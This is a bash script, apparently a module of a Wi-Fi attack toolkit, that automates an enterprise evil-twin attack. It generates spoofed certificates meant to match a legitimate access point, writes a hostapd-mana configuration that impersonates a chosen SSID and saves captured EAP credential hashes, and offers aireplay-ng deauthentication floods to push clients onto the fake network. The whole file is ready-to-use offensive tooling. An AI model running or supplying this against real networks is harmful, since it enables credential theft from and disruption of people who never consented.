#!/bin/bash

source Attacks/common.sh

# Color & style constants
RED='\033[0;31m'
GREEN='\033[0;32m'
BOLD='\033[1m'
NC='\033[0m'

# Require root privileges
require_root # NU AI NEVOIE STERGE DACA VREI SA MEARGA

# Main menu prompt
prompt_to_continue() {
    local options=("Start Enterprise Attack")

    echo
    echo -e "${GREEN}==============================================${NC}"
    echo -e "${BOLD}${GREEN}              Enterprise attack        ${NC}${BOLD}${NC}"
    echo -e "${GREEN}==============================================${NC}"
    sleep 0.5
    echo
    echo -e "${RED}[!]${NC} You need two Wi-Fi adapters: one for monitoring, one as the fake AP."
    echo -e "${RED}[!]${NC} Clients will see certificate warnings, advanced users may detect the spoof."

    echo
    echo -e "${GREEN}[*]${NC} Available options:"
    echo
    for i in "${!options[@]}"; do
        echo -e "  ${GREEN}[$((i+1))]${NC} ${options[$i]}"
        sleep 0.1
    done
    echo -e "  ${GREEN}[0]${NC} Go back"
    echo

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Choose an option:") " opt
        case "$opt" in
            1) break ;;  # proceed
            0) go_back ;;  # back
            *) echo -e "${RED}[!]${NC} Invalid. Choose 0 or 1."; sleep 0.3 ;;
        esac
    done
}

enterprise_attack() {
    clear 

    echo -e "${GREEN}[*]${NC} Generating Diffie-Hellman parameters..."

    sleep 0.3

    gnome-terminal --wait -- bash -c 'openssl dhparam -out dh.pem 2048; exit'

    echo -e "${GREEN}[✓]${NC} Parameters generation finished."

    sleep 0.3

    echo -e "${GREEN}[*]${NC} Generating Certificate Authority key..."

    sleep 0.3

    gnome-terminal --wait -- bash -c 'openssl genrsa -out ca-key.pem 2048; exit'

    echo -e "${GREEN}[✓]${NC} Certificate generation finished."

    sleep 0.3

    echo -e "${GREEN}[*]${NC} Generating x509 certificate..."

    echo -e "${RED}[!]${NC} Aim to match details of legitimate AP"

    sleep 1.3

    gnome-terminal --wait -- bash -c 'openssl req -new -x509 -nodes -days 100 -key ca-key.pem -out ca.pem; exit'

    echo -e "${GREEN}[✓]${NC} x509 certificate generation finished."

    sleep 0.3

    echo -e "${GREEN}[*]${NC} Generating server certificate and private key..."

    sleep 0.3

    gnome-terminal --wait -- bash -c 'openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server-key.pem; exit'

    sleep 0.1

    gnome-terminal --wait -- bash -c 'openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem; exit'

    echo -e "${GREEN}[✓]${NC} Server certificate and private key generation finished."

    sleep 1.3

    clear 

    echo -e "${GREEN}[*]${NC} Enter details for the evil-twin AP:"

    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Enter the SSID to impersonate: ")" ssid
        if [[ -n "$ssid" ]]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid SSID."
            sleep 0.3
        fi
    done

    echo -e "${GREEN}[✓]${NC} SSID set: $ssid"
    cat > hostapd.conf <<EOF
# 802.11 Options
interface=wlan1
ssid=$ssid
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user


# Certificates

ca_cert=ca.pem
server_cert=server.pem
private_key=server-key.pem
private_key_passwd=whatever
dh_file=dh.pem

enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1
EOF
    sleep 0.3

    echo -e "${GREEN}[✓]${NC} hostapd.conf created."

    read -rp "$(echo -e "${GREEN}[*]${NC} Input password for the evil-twin AP (Must be identical to the one used in the server private key generation!): ")" pass

    cat > hostapd.eap_user <<EOF
* PEAP,TTLS,TLS,MD5,GTC,FAST
"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAP "$pass" [2]
EOF
    
    sleep 0.3

    echo -e "${GREEN}[✓]${NC} hostapd.eap_user created."

    sleep 1.3

    clear

    echo -e "${GREEN}[*]${NC} Launching evil-twin AP..."

    gnome-terminal -- bash -c "sudo hostapd-mana hostapd.conf; exit" &

    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Do you want to deauthenticate the station to force the client to reconnect to our fake access point? (yes/no): ") " deauth_option
        if [[ "$deauth_option" == "yes" ]]; then
            sleep 1.3
            echo -e "${GREEN}[*]${NC} Enter target details:"
            # BSSID
            while true; do
                read -rp "$(echo -e "${GREEN}[*]${NC} BSSID (XX:XX:XX:XX:XX:XX):") " bssid
                [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && break
                echo -e "${RED}[!]${NC} Invalid BSSID."; sleep 0.3
            done
            echo -e "${GREEN}[✓]${NC} BSSID set: $bssid"

            # Client MAC
            while true; do
                read -rp "$(echo -e "${GREEN}[*]${NC} Client MAC (optional):") " client
                [[ -z "$client" || "$client" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && break
                echo -e "${RED}[!]${NC} Invalid MAC."; sleep 0.3
            done
            echo -e "${GREEN}[✓]${NC} Client set: $client"

            if [[ -z "$client" ]]; then
                gnome-terminal -- bash -c "sudo aireplay-ng --deauth 10 -a \"$bssid\" \"$MONITOR_INTERFACE\"; exit" &

            else
                gnome-terminal -- bash -c "sudo aireplay-ng --deauth 10 -a \"$bssid\" -c \"$client\" \"$MONITOR_INTERFACE\"; exit" &

            fi

            break
        elif [[ "$deauth_option" == "no" ]]; then
            echo -e "${GREEN}[*]${NC} Deauthentication attack skipped."
            sleep 1.3
            break
        else
            echo -e "${RED}[!]${NC} Invalid option. Please enter (yes/no)."
        fi
    done


    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Type 'stop' to stop the process: ")" user_input
        if [[ "$user_input" == "stop" ]]; then
            sudo pkill hostapd-mana
            echo -e "${GREEN}[*]${NC} Removing temporary cert/config files…"
            echo -e "${GREEN}[*]${NC} Captured hash saved in ${BOLD}credentials.creds${NC}"
            rm -f ca.pem ca-key.pem dh.pem server-key.pem server.pem hostapd.conf hostapd.eap_user
            sleep 0.3
            break
        else
            echo -e "${RED}[!]${NC} Invalid input. Please type 'stop' to stop the command."
        fi
    done

    echo -e "${GREEN}[✓]${NC} Attack complete."; sleep 0.5
    
    sleep 1.3
}

# Repeat or go back (stop capture then menu)
after_attack_options() {
    echo
    echo -e "  ${GREEN}[1]${NC} New Mana attack"
    echo -e "  ${GREEN}[0]${NC} Go back to main menu"
    echo
    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Choose an option:") " o
        case "$o" in
            1) clear; enterprise_attack; after_attack_options; break ;;  
            0) ask_stop_capture; go_back ;;
            *) echo -e "${RED}[!]${NC} Type 0 or 1."; sleep 0.3
        esac
    done
}

# Entry point
main() {
    clear
    prompt_to_continue
    check_monitor_interfaces
    ask_capture_choice
    enterprise_attack
    after_attack_options
}

main
